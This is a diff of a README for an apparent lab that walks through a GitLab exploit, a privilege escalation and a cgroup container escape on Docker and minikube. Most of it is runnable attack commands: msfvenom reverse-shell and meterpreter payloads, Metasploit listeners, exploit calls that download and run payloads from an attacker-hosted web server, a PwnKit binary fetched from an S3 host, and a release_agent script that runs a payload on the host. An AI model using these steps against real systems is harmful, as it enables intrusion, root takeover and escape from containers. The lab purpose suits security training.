@@ -9,7 +9,7 @@
 
 ## Docker on Ubuntu 20.04 LTS
 
-- i used the following vagrant machine
+I used the following vagrant machine
 
 ```
 config.vm.define "ub2004" do |ub2004|
@@ -22,77 +22,89 @@ config.vm.define "ub2004" do |ub2004|
 end
 ```
 
-- install the following stuff
+Install the following stuff
 
 ```bash
-apt update && apt remove -y netcat-openbsd && apt install -y netcat-traditional
+sudo apt update && apt remove -y netcat-openbsd && apt install -y netcat-traditional
 ```
 
-- install docker
+Install docker
 
 ```bash
-apt install -y ca-certificates curl gnupg lsb-release
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
-echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-apt update
-apt install -y docker-ce docker-ce-cli containerd.io docker-compose
-usermod -a -G docker vagrant
+sudo apt install -y ca-certificates curl gnupg lsb-release
+sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
+sudo echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+sudo apt update
+sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose
+sudo usermod -a -G docker vagrant
 ```
 
-- then your docker daemon is in [Rootless mode](https://docs.docker.com/engine/security/rootless/). you have to execute the following commands
+The docker daemon is in [Rootless mode](https://docs.docker.com/engine/security/rootless/). You have to execute the following commands
 
 ```bash
-apt install -y uidmap
+sudo apt install -y uidmap
 dockerd-rootless-setuptool.sh uninstall --force
 ```
 
-- build the container
+Build the container
 
 ```bash
 docker build -t gitlab-escape -f ./Dockerfile .
 ```
 
-- start the GitLab application via docker-compose
+Start the GitLab application via docker-compose
 
 ```bash
 docker-compose up
 ```
 
-- create a new GitLab user (mondoo, mondoo.com)
+Create a new GitLab user (mondoo, mondoo.com)
 
 ![GitLab user register](images/gitlab-user-register.png)
 
-- create the meterpreter
+Create the meterpreter for the GitLab container
 
 ```bash
-msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=4242 -f elf > met
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=4242 -f elf > met-container
 ```
 
-- start the metasploit framework
+Start the metasploit framework for the GitLab container connection
 
 ```bash
 msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
 ```
 
-- start the on liner web server
+Create the reverse shell for the docker host
+
+```bash
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.56.1 LPORT=4243 -f elf > met-host
+```
+
+Start the metasploit framework for the docker host connection
+
+```bash
+msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
+```
+
+Start the on liner web server that the victim can download the shells
 
 ```bash
 ruby -run -ehttpd . -p8001
 ```
 
-- execute the GitLab exploit
+Execute the GitLab exploit
 
 ```bash
-python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c 'curl -vk http://192.168.56.1:8001/met -o /tmp/met'
+python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c 'curl -vk http://192.168.56.1:8001/met-container -o /tmp/met'
 
 python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c 'chmod 777 /tmp/met'
 
 python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c '/tmp/met'
 ```
 
-- now you have a reverse meterpreter connection, type `shell` to get a bash
+Now you have a reverse meterpreter connection, type `shell` to get a bash.
 
-- get root within the GitLab container
+Get root within the GitLab container
 
 ```bash
 id
@@ -110,30 +122,28 @@ id
 uid=0(root) gid=0(root) groups=0(root),998(git)
 ```
 
-- to execute the container escape, at first start a new netcat listner
-
-```bash
-nc -lvnp 4243
-```
-
-- execute the following commands in your reverse root shell
+Execute the following commands in your GitLab root shell
 
 ```bash
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgrp/release_agent
 echo '#!/bin/sh' > /cmd
-echo "nc -e /bin/bash 192.168.56.1 4243" >> /cmd
+echo "curl -vk http://192.168.56.1:8001/met-host -o /tmp/met" >> /cmd
+echo "chmod 777 /tmp/met" >> /cmd
+echo "/tmp/met" >> /cmd
 chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
-## kubernetes cluster
+Now you got a root shell from your container host.
+
+## kubernetes cluster (minikube)
 
 If minikube is used, you can easily start and build the container locally:
 
 ```bash
-# NOTE: if minikube is used with docker desktop, you need to configure docker desktop before
+# NOTE: if minikube is used with docker desktop, you need to configure docker desktop before. The node got the ip 192.168.59.100
 minikube start --memory 4096 --cpus 4
 eval $(minikube docker-env)
 docker build -t docker.io/hacklab/gitlab-escape -f ./Dockerfile .
@@ -150,12 +160,88 @@ Forward the pod ports locally:
 ```bash
 kubectl get pods
 NAME                                       READY   STATUS    RESTARTS   AGE
-gitlab-container-escape-7d845f77c6-4twd7   1/1     Running   0          94s
+gitlab-container-escape-7bbd59fc59-2nrqc   1/1     Running   0          94s
 
-kubectl port-forward gitlab-container-escape-7d7cfb4699-rp6dq 5080:80
-kubectl port-forward gitlab-container-escape-7d7cfb4699-rp6dq 50443:443
-kubectl port-forward gitlab-container-escape-7d845f77c6-4twd7 5022:22
+kubectl port-forward gitlab-container-escape-7bbd59fc59-2nrqc 5080:80
+kubectl port-forward gitlab-container-escape-7bbd59fc59-2nrqc 50443:443
+kubectl port-forward gitlab-container-escape-7bbd59fc59-2nrqc 5022:22
 ```
+
+Create the meterpreter for the GitLab container
+
+```bash
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.59.1 LPORT=4242 -f elf > met-container
+```
+
+Start the metasploit framework for the GitLab container connection
+
+```bash
+msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
+```
+
+Create the reverse shell for the docker host
+
+```bash
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.59.1 LPORT=4243 -f elf > met-host
+```
+
+Start the metasploit framework for the docker host connection
+
+```bash
+msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
+```
+
+Start the on liner web server that the victim can download the shells
+
+```bash
+ruby -run -ehttpd . -p8001
+```
+
+Execute the GitLab exploit
+
+```bash
+python gitlab-msf.py -u mondoo -p mondoo.com -g http://127.0.0.1 -c 'curl -vk http://192.168.59.1:8001/met-container -o /tmp/met'
+
+python gitlab-msf.py -u mondoo -p mondoo.com -g http://127.0.0.1 -c 'chmod 777 /tmp/met'
+
+python gitlab-msf.py -u mondoo -p mondoo.com -g http://127.0.0.1 -c '/tmp/met'
+```
+
+Now you have a reverse meterpreter connection, type `shell` to get a bash.
+
+Get root within the GitLab container
+
+```bash
+id
+uid=998(git) gid=998(git) groups=998(git)
+
+cd /tmp
+
+curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
+
+chmod a+x ./priv-es
+
+./priv-es
+
+id
+uid=0(root) gid=0(root) groups=0(root),998(git)
+```
+
+Execute the following commands in your GitLab root shell
+
+```bash
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "curl -vk http://192.168.59.1:8001/met-host -o /tmp/met" >> /cmd
+echo "chmod 777 /tmp/met" >> /cmd
+echo "/tmp/met" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
+Now you got a root shell from your container host.
 
 To delete the deployment just run:
 
@@ -175,7 +261,7 @@ echo "$host_path/cmd" > /tmp/cgrp/release_agent
 echo '#!/bin/sh' > /cmd
 echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
-sh -c 'echo \$\$ > /tmp/cgrp/x/cgroup.procs'
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
 - reverse shell with netcat
